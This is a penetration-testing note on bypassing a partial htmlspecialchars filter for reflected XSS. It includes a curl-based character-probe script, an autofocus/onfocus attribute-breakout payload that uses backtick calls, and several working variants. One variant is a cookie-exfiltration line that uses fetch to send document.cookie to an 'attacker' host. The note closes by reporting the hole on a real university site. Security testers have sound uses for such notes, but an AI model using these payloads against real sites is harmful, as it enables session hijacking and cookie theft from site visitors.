# XSS: htmlspecialchars Partial-Filter Bypass (Parens Encoded, Quote Not)

A recurring real-world filter pattern: the app encodes `<`, `>`, `'`, `(`, `)` (via `htmlspecialchars` or a custom entity table) but **fails to encode the double quote `"`** when reflecting into a `value=""` attribute. Backticks (`` ` ``) also typically slip through.

## Detection — Verify the filter char-map FIRST

Send individual characters as probe values and inspect the raw reflected bytes (use Python `repr()` on the segment, not the visual string):

```python
import urllib.parse, subprocess
for c in '\'"<>()&=#`':
    enc = urllib.parse.quote_plus('x'+c+'y')
    r = subprocess.run(['curl','-skS','--data','searchText='+enc,'https://target/'],capture_output=True,text=True).stdout
    idx = r.find('id="searchText"')
    seg = r[idx:idx+200]
    print(f"  char {c!r:5s} -> {repr(seg)}")
```

If `"` appears raw in the reflected `value=""` while `(` `)` become `&#40;` `&#41;`, the bypass below applies.

## Bypass — Two moves

1. **Attribute breakout**: Inject `"` to close `value=""`, then add event handler attributes. Browser HTML parsers decode `&#40;1&#41;` back to `(1)` inside attribute values, so the JS fires.

2. **Backtick call form**: `` alert`1` `` instead of `alert(1)`. Valid JS tagged-template syntax, completely bypasses `(` `)` encoding.

## Auto-fire payload (no click needed)

```
" autofocus onfocus=alert`XSS` x="
```

Reflected as:
```html
<input value="" autofocus onfocus=alert`XSS` x="">
```

`autofocus` forces focus on page load → `onfocus` fires immediately → `alert` runs. No user interaction.

## Verification signal

When tested in a browser, the page becomes unresponsive (infinite alert loop — `autofocus` re-triggers `onfocus` after each `alert()` dismissal). This unresponsiveness IS the proof of execution. Browser DevTools/console commands will time out while the alert dialog is active.

## Other working variants

```
" autofocus onfocus=alert`1` x="
" autofocus onfocus=confirm`1` x="
" autofocus onfocus=prompt`1` x="
" autofocus onfocus=alert(document.domain) x="   (parens encoded to &#40;&#41; but browser decodes)
" autofocus onfocus=fetch("//attacker/?c="+document.cookie) x="   (cookie exfil)
```

## Engagement where this was found

University target (CodeIgniter/PHP 7.2/Apache 2.4.6). Homepage search form `POST /` with `searchText` reflected into `<input value="">`. Filter encoded `<>'()` but not `"`. The `alert\`XSS_CONFIRMED\`` payload caused a browser modal loop that locked the page.
